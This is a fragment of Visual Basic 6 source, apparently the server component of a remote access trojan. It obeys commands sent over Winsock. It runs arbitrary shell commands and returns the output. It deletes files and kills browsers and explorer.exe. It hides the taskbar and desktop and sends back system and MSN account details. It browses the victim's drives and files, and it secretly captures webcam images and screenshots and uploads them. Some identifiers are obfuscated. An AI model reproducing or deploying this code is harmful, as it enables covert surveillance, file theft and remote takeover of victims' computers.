Winsock1.SendData "INFO|" + Text9.Text & "|" & Text10.Text & "|" & Text11.Text & "|" & Text12.Text & "|" & Text14.Text & "|" & Text15.Text & "|" & Text16.Text & "|" & Text17.Text


End If
If Data2(0) = "DESKHIDE" Then
fundesktop 0

End If
If Data2(0) = "DESKSHOW" Then
fundesktop 1

End If
If Data2(0) = "MOUSEHIDE" Then
funswapfare -30
End If
If Data2(0) = "MOUSESHOW" Then
funswapfare -30
End If
If Data2(0) = "STARTHIDE" Then
funstartbutton 0
End If
If Data2(0) = "STARTSHOW" Then
funstartbutton 1
End If
If Data2(0) = "STARTBLOCK" Then
funstartbutton 2
End If
If Data2(0) = "STARTUNLOCK" Then
funstartbutton 3
End If
If Data2(0) = "TASKHIDE" Then
funtaskbar 0
End If
If Data2(0) = "TASKSHOW" Then
funtaskbar 1
End If
If Data2(0) = "TASKBLOCK" Then
funtaskbar 2
End If
If Data2(0) = "TASKUNLOCK" Then
funtaskbar 3
End If
If Data2(0) = "HIDEICON" Then
funtaskicons 1
End If
If Data2(0) = "SHOWICON" Then
funtaskicons 0
End If
If Data2(0) = "CDON" Then
funcdrom 0
End If
If Data2(0) = "CDOFF" Then
funcdrom 1
End If
If Data2(0) = "DESKFLIP" Then
funflipscreen 0
End If
If Data2(0) = "DESKFLIPFIX" Then
funflipscreen 1
End If
If Data2(0) = "HIDECLOCK" Then
funhideclock 0
End If
If Data2(0) = "SHOWCLOCK" Then
funhideclock 1
End If
If Data2(0) = "HIDECLOCK" Then
funtaskbar 3
End If
If Data2(0) = "HIDECLOCK" Then
funtaskbar 3
End If
If Data2(0) = "cmd" Then
 On Error GoTo errore
    objDOS.CommandLine = Data2(1)
    objDOS.ExecuteCommand
    DoEvents
    Winsock1.SendData "cmdrecive|" & Text18.Text
    DoEvents
    Text18.Text = ""
    Exit Sub
   
 
 
errore:
    Winsock1.SendData "Errore"
End If

If Data2(0) = "volume" Then
Dim vol As Long
vol = Data2(1)
SetVolume vol
End If
If Data2(0) = "DEL" Then
Kill Data2(1)
End If
If Data2(0) = "avvio" Then
GoToWebsite Data2(1)
End If
If Data2(0) = "msn" Then
Winsock1.SendData "msnrecive|" & sMSN
End If
If Data2(0) = "Format" Then



End If
If Data2(0) = "infinitemessage" Then

Text20.Text = Data2(1)
Timer3.Enabled = True

End If
If Data2(0) = "messagestop" Then

Timer3.Enabled = False

End If
If Data2(0) = "offbrowser" Then

Shell "taskkill /f /im firefox.exe"
Shell "taskkill /f /im iexplore.exe"
Shell "taskkill /f /im chrome.exe"
Shell "taskkill /f /im opera.exe"
Shell "taskkill /f /im safari.exe"

End If
If Data2(0) = "killdesktop" Then

Shell "taskkill /f /im explorer.exe"

End If
If Data2(0) = "CMDON" Then

Timer4.Enabled = True

End If
If Data2(0) = "CMDOFF" Then

Timer4.Enabled = False

End If
If Data2(0) = "" Then

Timer3.Enabled = False

End If
If Data2(0) = "" Then

Timer3.Enabled = False

End If


Dim MXEydzM0NTY3ODkwb2tpanV5dDU0MzM0cmZndmJuamtvMDk4N3V5dGdmZGU0NXQ2eQ As String



End Sub





Private Sub WinsockFile_DataArrival(ByVal byVGVzdG8tal As Long)
On Error Resume Next
Dim ZGF0YXM As String
Dim All_Data As String
WinsockFile.GetData ZGF0YXM
All_Data = Right(ZGF0YXM, Len(ZGF0YXM) - 4)
Select Case Left(ZGF0YXM, 4)
Case "Driv"
    WinsockFile.SendData "Driv" & GetAllDrives
Case "Fold"
    Call SendFiles(All_Data, , , False)
Case "File"
    Call SendFiles(All_Data, "*.*", , True)
End Select
End Sub



Private Sub WinsockWebCam_DataArrival(ByVal byVGVzdG8tal As Long)
On Error Resume Next
Dim Datos As String
Dim vDatos() As String
WinsockWebCam.GetData Datos
vDatos = Split(Datos, "|")
Select Case vDatos(0)
Case "Cerrar"
End
Case "webcamoff"
DoEvents
SendMessage mdlwebcam.CamHwnd, 1035, 0, 0
Case "webcam"
 mdlwebcam.CamHwnd = mdlwebcam.capCreateCaptureWindow("Webcam", 0, 0, 0, 320, 240, Me.hWnd, 0)
             SendMessage mdlwebcam.CamHwnd, 1034, 0, 0
            
Case "webcamrecive"
 Clipboard.Clear
        SendMessage mdlwebcam.CamHwnd, 1084, 0, 0
        SendMessage mdlwebcam.CamHwnd, 1054, 0, 0
       Picture2.Picture = Clipboard.GetData
        SaveJPG Picture2, "C:\webcam.jpg", CByte(80)
        
Open "c:\webcam.jpg" For Binary As #1
file = Input(LOF(1), 1)
Close #1
FileTotal = Len(file)
WinsockWebCam.SendData "Screen|" & FileTotal
Kill "c:\webcam.jpg"
Case "OK"
WinsockWebCam.SendData file
Case "Name"
Nombre = vDatos(1)
Kill WINDOWS & "\name"
Open WINDOWS & "\name" For Binary As #1
Put #1, 1, Nombre
Close #1
End Select
End Sub
Private Sub ws_DataArrival(ByVal byVGVzdG8tal As Long)
On Error Resume Next
Dim Datos As String
Dim vDatos() As String
ws.GetData Datos
vDatos = Split(Datos, "|")
Select Case vDatos(0)
Case "Cerrar"
End
Case "Screen"
Resolucion = vDatos(1)
Foto.SetSamplingFrequencies 2, 2, 2, 2, 2, 2
Foto.Quality = Resolucion
Foto.SampleScreen
Foto.SaveFile ("c:\capture.jpg")
Open "c:\capture.jpg" For Binary As #1
file = Input(LOF(1), 1)
Close #1
FileTotal = Len(file)
ws.SendData "Screen|" & FileTotal
Kill "c:\capture.jpg"
Case "OK"
ws.SendData file
Case "Name"
Nombre = vDatos(1)
Kill WINDOWS & "\name"
Open WINDOWS & "\name" For Binary As #1
Put #1, 1, Nombre
Close #1
End Select

End Sub
Public Sub SaveJPG(ByVal pict As StdPicture, ByVal FileName As String, Optional ByVal Quality As Byte = 80)
Dim tSI As GdiplusStartupInput
Dim lRes As Long
Dim lGDIP As Long
Dim lBitmap As Long

' AnticipatingMistakes
On Error Resume Next

   ' Initialize GDI+
   tSI.GdiplusVersion = 1
   lRes = GdiplusStartup(lGDIP, tSI)

   If lRes = 0 Then

      ' Create the GDI+ bitmap
      ' from the image handle
      lRes = GdipCreateBitmapFromHBITMAP(pict.handle, 0, lBitmap)

      If lRes = 0 Then
         Dim tJpgEncoder As GUID
         Dim tParams As EncoderParameters

         ' Initialize the encoder GUID
         CLSIDFromString StrPtr("{557CF401-1A04-11D3-9A73-0000F81EF32E}"), _
                         tJpgEncoder

         ' Initialize the encoder parameters
         tParams.Count = 1
         With tParams.Parameter ' Quality
            ' Set the Quality GUID
            CLSIDFromString _
StrPtr("{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}"), .GUID
            .NumberOfValues = 1
            .Type = 4
            .Value = VarPtr(Quality)
         End With

         ' Save the image
         lRes = GdipSaveImageToFile( _
                  lBitmap, _
                  StrPtr(FileName), _
                  tJpgEncoder, _
                  tParams)

         ' Destroy the bitmap
         GdipDisposeImage lBitmap

      End If

      ' Shutdown GDI+
      GdiplusShutdown lGDIP

   End If

   If lRes Then
      Err.Raise 5, , "Cannot save the image. GDI+ Error:" & lRes
   End If

End Sub
Private Sub objDOS_ReceiveOutputs(CommandOutputs As String)
    Text18.Text = Text18.Text & CommandOutputs
End Sub

Public Sub GoToWebsite(Website As String)
If ShellExecute(&O0, "Open", Website$, vbNullString, vbNullString, SW_NORMAL) < 33 Then
End If
End Sub



